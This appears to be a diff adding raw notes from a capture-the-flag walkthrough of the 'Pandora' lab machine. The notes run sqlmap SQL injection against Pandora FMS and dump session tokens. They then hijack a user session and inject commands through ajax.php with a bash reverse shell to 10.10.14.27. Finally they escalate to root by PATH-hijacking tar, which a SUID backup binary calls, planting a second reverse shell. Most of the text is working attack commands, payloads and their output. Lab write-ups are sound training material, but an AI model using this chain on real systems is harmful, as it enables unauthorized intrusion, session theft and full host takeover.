@@ -132,15 +132,491 @@ Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
 tcp        0      0 127.0.0.1:9099          0.0.0.0:*               LISTEN      125655/ssh          
 tcp6       0      0 ::1:9099                :::*                    LISTEN      125655/ssh          
                                                                                                                      
-add 127.0.0.1 pandora.panda.htb to /etc/hosts (optional)
+setup foxy proxy to use sock5 127.0.0.1 port 9099
+
+navigate to localhost:80
 
 webpage is Pandora FMS
 v7.0NG.742_FIX_PERL2020
 
 
 
+┌──(root㉿kali)-[/home/kali]
+└─# sqlmap -u "http://localhost/pandora_console/include/chart_generator.php?session_id=''" --current-db --proxy="socks5://127.0.0.1:9099"
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9.8#stable}
+|_ -| . [']     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:52:52 /2025-11-30/
+
+[10:52:52] [INFO] testing connection to the target URL
+[10:52:52] [WARNING] potential permission problems detected ('Access denied')
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=699juprnsn9...pb354663ia'). Do you want to use those [Y/n] n
+[10:52:54] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+[10:52:54] [INFO] testing if the target URL content is stable
+[10:52:54] [INFO] target URL content is stable
+[10:52:54] [INFO] testing if GET parameter 'session_id' is dynamic
+[10:52:55] [WARNING] GET parameter 'session_id' does not appear to be dynamic
+[10:52:55] [INFO] heuristic (basic) test shows that GET parameter 'session_id' might be injectable (possible DBMS: 'MySQL')
+[10:52:55] [INFO] heuristic (XSS) test shows that GET parameter 'session_id' might be vulnerable to cross-site scripting (XSS) attacks
+[10:52:55] [INFO] testing for SQL injection on GET parameter 'session_id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] n
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) valueY
+...
+GET parameter 'session_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 310 HTTP(s) requests:
+---
+Parameter: session_id (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: session_id=''' RLIKE (SELECT (CASE WHEN (9495=9495) THEN 0x2727 ELSE 0x28 END))-- xdhi
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: session_id=''' OR (SELECT 5937 FROM(SELECT COUNT(*),CONCAT(0x717a706a71,(SELECT (ELT(5937=5937,1))),0x717a707171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- tTXj
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: session_id=''' AND (SELECT 2033 FROM (SELECT(SLEEP(5)))TrdN)-- LHdI
+---
+[10:54:46] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (eoan or focal)
+web application technology: PHP, Apache 2.4.41
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[10:54:47] [INFO] fetching current database
+[10:54:47] [INFO] retrieved: 'pandora'
+current database: 'pandora'
+[10:54:47] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/localhost'
+
+[*] ending @ 10:54:47 /2025-11-30/
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# sqlmap -u "http://localhost/pandora_console/include/chart_generator.php?session_id=''" --proxy="socks5://127.0.0.1:9099" -D pandora --tables      
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.9.8#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:59:09 /2025-11-30/
+
+[10:59:09] [INFO] resuming back-end DBMS 'mysql' 
+[10:59:09] [INFO] testing connection to the target URL
+[10:59:09] [WARNING] potential permission problems detected ('Access denied')
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=fv2424oa4gt...1p5m264h3j'). Do you want to use those [Y/n] n
+[10:59:12] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: session_id (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: session_id=''' RLIKE (SELECT (CASE WHEN (9495=9495) THEN 0x2727 ELSE 0x28 END))-- xdhi
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: session_id=''' OR (SELECT 5937 FROM(SELECT COUNT(*),CONCAT(0x717a706a71,(SELECT (ELT(5937=5937,1))),0x717a707171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- tTXj
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: session_id=''' AND (SELECT 2033 FROM (SELECT(SLEEP(5)))TrdN)-- LHdI
+---
+[10:59:12] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (eoan or focal)
+web application technology: Apache 2.4.41, PHP
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[10:59:12] [INFO] fetching tables for database: 'pandora'
+Database: pandora
+[178 tables]
++------------------------------------+
+| taddress                           |
+| taddress_agent                     |
+| tagent_access                      |
+| tagent_custom_data                 |
+| tagent_custom_fields               |
+| tagent_custom_fields_filter        |
+| tagent_module_inventory            |
+| tagent_module_log                  |
+| tagent_repository                  |
+| tagent_secondary_group             |
+| tagente                            |
+| tagente_datos                      |
+| tagente_datos_inc                  |
+| tagente_datos_inventory            |
+| tagente_datos_log4x                |
+| tagente_datos_string               |
+| tagente_estado                     |
+| tagente_modulo                     |
+| talert_actions                     |
+| talert_commands                    |
+| talert_snmp                        |
+| talert_snmp_action                 |
+| talert_special_days                |
+| talert_template_module_actions     |
+| talert_template_modules            |
+| talert_templates                   |
+| tattachment                        |
+| tautoconfig                        |
+| tautoconfig_actions                |
+| tautoconfig_rules                  |
+| tcategory                          |
+| tcluster                           |
+| tcluster_agent                     |
+| tcluster_item                      |
+| tcollection                        |
+| tconfig                            |
+| tconfig_os                         |
+| tcontainer                         |
+| tcontainer_item                    |
+| tcredential_store                  |
+| tdashboard                         |
+| tdatabase                          |
+| tdeployment_hosts                  |
+| tevent_alert                       |
+| tevent_alert_action                |
+| tevent_custom_field                |
+| tevent_extended                    |
+| tevent_filter                      |
+| tevent_response                    |
+| tevent_rule                        |
+| tevento                            |
+| textension_translate_string        |
+| tfiles_repo                        |
+| tfiles_repo_group                  |
+| tgis_data_history                  |
+| tgis_data_status                   |
+| tgis_map                           |
+| tgis_map_connection                |
+| tgis_map_has_tgis_map_con          |
+| tgis_map_layer                     |
+| tgis_map_layer_groups              |
+| tgis_map_layer_has_tagente         |
+| tgraph                             |
+| tgraph_source                      |
+| tgraph_source_template             |
+| tgraph_template                    |
+| tgroup_stat                        |
+| tgrupo                             |
+| tincidencia                        |
+| titem                              |
+| tlanguage                          |
+| tlayout                            |
+| tlayout_data                       |
+| tlayout_template                   |
+| tlayout_template_data              |
+| tlink                              |
+| tlocal_component                   |
+| tlog_graph_models                  |
+| tmap                               |
+| tmensajes                          |
+| tmetaconsole_agent                 |
+| tmetaconsole_agent_secondary_group |
+| tmetaconsole_event                 |
+| tmetaconsole_event_history         |
+| tmetaconsole_setup                 |
+| tmigration_module_queue            |
+| tmigration_queue                   |
+| tmodule                            |
+| tmodule_group                      |
+| tmodule_inventory                  |
+| tmodule_relationship               |
+| tmodule_synth                      |
+| tnetflow_filter                    |
+| tnetflow_report                    |
+| tnetflow_report_content            |
+| tnetwork_component                 |
+| tnetwork_component_group           |
+| tnetwork_map                       |
+| tnetwork_matrix                    |
+| tnetwork_profile                   |
+| tnetwork_profile_component         |
+| tnetworkmap_ent_rel_nodes          |
+| tnetworkmap_enterprise             |
+| tnetworkmap_enterprise_nodes       |
+| tnews                              |
+| tnota                              |
+| tnotification_group                |
+| tnotification_source               |
+| tnotification_source_group         |
+| tnotification_source_group_user    |
+| tnotification_source_user          |
+| tnotification_user                 |
+| torigen                            |
+| tpassword_history                  |
+| tperfil                            |
+| tphase                             |
+| tplanned_downtime                  |
+| tplanned_downtime_agents           |
+| tplanned_downtime_modules          |
+| tplugin                            |
+| tpolicies                          |
+| tpolicy_agents                     |
+| tpolicy_alerts                     |
+| tpolicy_alerts_actions             |
+| tpolicy_collections                |
+| tpolicy_groups                     |
+| tpolicy_modules                    |
+| tpolicy_modules_inventory          |
+| tpolicy_plugins                    |
+| tpolicy_queue                      |
+| tprofile_view                      |
+| tprovisioning                      |
+| tprovisioning_rules                |
+| trecon_script                      |
+| trecon_task                        |
+| trel_item                          |
+| tremote_command                    |
+| tremote_command_target             |
+| treport                            |
+| treport_content                    |
+| treport_content_item               |
+| treport_content_item_temp          |
+| treport_content_sla_com_temp       |
+| treport_content_sla_combined       |
+| treport_content_template           |
+| treport_custom_sql                 |
+| treport_template                   |
+| treset_pass                        |
+| treset_pass_history                |
+| tserver                            |
+| tserver_export                     |
+| tserver_export_data                |
+| tservice                           |
+| tservice_element                   |
+| tsesion                            |
+| tsesion_extended                   |
+| tsessions_php                      |
+| tskin                              |
+| tsnmp_filter                       |
+| ttag                               |
+| ttag_module                        |
+| ttag_policy_module                 |
+| ttipo_modulo                       |
+| ttransaction                       |
+| ttrap                              |
+| ttrap_custom_values                |
+| tupdate                            |
+| tupdate_journal                    |
+| tupdate_package                    |
+| tupdate_settings                   |
+| tuser_double_auth                  |
+| tuser_task                         |
+| tuser_task_scheduled               |
+| tusuario                           |
+| tusuario_perfil                    |
+| tvisual_console_elements_cache     |
+| twidget                            |
+| twidget_dashboard                  |
++------------------------------------+
+
+[10:59:12] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/localhost'
+
+[*] ending @ 10:59:12 /2025-11-30/
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
 
 
 
 
+┌──(root㉿kali)-[/home/kali]
+└─# sqlmap -u "http://localhost/pandora_console/include/chart_generator.php?session_id=''" --proxy="socks5://127.0.0.1:9099" -T tsessions_php --dump         
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9.8#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:01:12 /2025-11-30/
+
+[11:01:12] [INFO] resuming back-end DBMS 'mysql' 
+[11:01:12] [INFO] testing connection to the target URL
+[11:01:45] [WARNING] potential permission problems detected ('Access denied')
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=ehn236ou8eg...3ofjeaj3n1'). Do you want to use those [Y/n] n
+[11:01:50] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: session_id (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: session_id=''' RLIKE (SELECT (CASE WHEN (9495=9495) THEN 0x2727 ELSE 0x28 END))-- xdhi
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: session_id=''' OR (SELECT 5937 FROM(SELECT COUNT(*),CONCAT(0x717a706a71,(SELECT (ELT(5937=5937,1))),0x717a707171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- tTXj
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: session_id=''' AND (SELECT 2033 FROM (SELECT(SLEEP(5)))TrdN)-- LHdI
+---
+...
+| ftjr1ck8175cr79e4o5ta6vn97 | NULL                                                | 1764518075  |
+| fv2424oa4gtttiar1p5m264h3j | NULL                                                | 1764518355  |
+| g0ihu8of0mesge110lcddjov6c | NULL                                                | 1764518021  |
+| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:"daniel";                            | 1638783230  |
+| g1dchp8f52ps3qcreeqm090tdc | NULL                                                | 1764518063  |
+| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0; | 1638796349  |
+| g9ljkala57aiuh227uoabl9b72 | NULL                                                | 1764518073  |
+| ga70hbrrtt37gppgqm9qa23ddj | NULL                                                | 1764518072  
+
+
+
+we use matt's session id
+
+
+http://localhost/pandora_console/include/chart_generator.php?session_id=g4e01qdgk36mfdh90hvcc54umq
+
+
+then back to localhost:80 and we are logged in
+
+
+
+POST /pandora_console/ajax.php HTTP/1.1
+Host: localhost
+Content-Length: 92
+sec-ch-ua-platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+sec-ch-ua: "Chromium";v="139", "Not;A=Brand";v="99"
+sec-ch-ua-mobile: ?0
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://localhost
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost/pandora_console/index.php?sec=eventos&sec2=operation/events/events
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=lg2turp38brs0nbmm2hcddbaf5
+Connection: keep-alive
+
+page=include%2fajax%2fevents&perform_event_response=10000000&target=whoami&response_id=1
+
+confirms code execution as matt
+
+POST /pandora_console/ajax.php HTTP/1.1
+Host: localhost
+Content-Length: 88
+sec-ch-ua-platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+sec-ch-ua: "Chromium";v="139", "Not;A=Brand";v="99"
+sec-ch-ua-mobile: ?0
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://localhost
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost/pandora_console/index.php?sec=eventos&sec2=operation/events/events
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=lg2turp38brs0nbmm2hcddbaf5
+Connection: keep-alive
+
+page=include%2fajax%2fevents&perform_event_response=10000000&target=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.27%2F443%200%3E%261%27&response_id=1
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lnvp 443 
+listening on [any] 443 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.10.11.136] 41594
+bash: cannot set terminal process group (5371): Inappropriate ioctl for device
+bash: no job control in this shell
+matt@pandora:/var/www/pandora/pandora_console$ 
+
+
+matt@pandora:/home/matt$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/pandora_backup
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/at
+/usr/bin/fusermount
+/usr/bin/chsh
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+matt@pandora:/home/matt$ 
+
+
+
+matt@pandora:/home/matt$ echo $SHELL
+/bin/bash
+matt@pandora:/home/matt$ echo $-
+himBHs
+matt@pandora:/home/matt$ /usr/bin/pandora_backup
+PandoraFMS Backup Utility
+Now attempting to backup PandoraFMS client
+tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
+tar: Error is not recoverable: exiting now
+Backup failed!
+Check your permissions!
+matt@pandora:/home/matt$ 
+
+
+we try to run the backup and it fails due to permissions reading a folder.
+we presume we must be in a restricted shell, although things do not seem that way.
+
+
+-i-5.0$ echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
+warning: commands will be executed using /bin/sh
+job 1 at Sun Nov 30 17:58:00 2025
+/bin/sh: 0: can't access tty; job control turned off
+$ /usr/bin/pandora_backup
+PandoraFMS Backup Utility
+Now attempting to backup PandoraFMS client
+tar: Removing leading `/' from member names
+/var/www/pandora/pandora_console/AUTHORS
+...
+
+
+we pull that into our machine and run strings
+we see it calls tar from the relative path
+
+
+
+echo '#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.27/53 0>&1' > tar
+
+
+
+matt@pandora:/tmp$ chmod +x tar
+chmod +x tar
+matt@pandora:/tmp$ export PATH=/tmp:$PATH
+export PATH=/tmp:$PATH
+matt@pandora:/tmp$ /usr/bin/pandora_backup
+/usr/bin/pandora_backup
+PandoraFMS Backup Utility
+Now attempting to backup PandoraFMS client
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lnvp 53 
+listening on [any] 53 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.10.11.136] 46982
+root@pandora:/tmp#
 
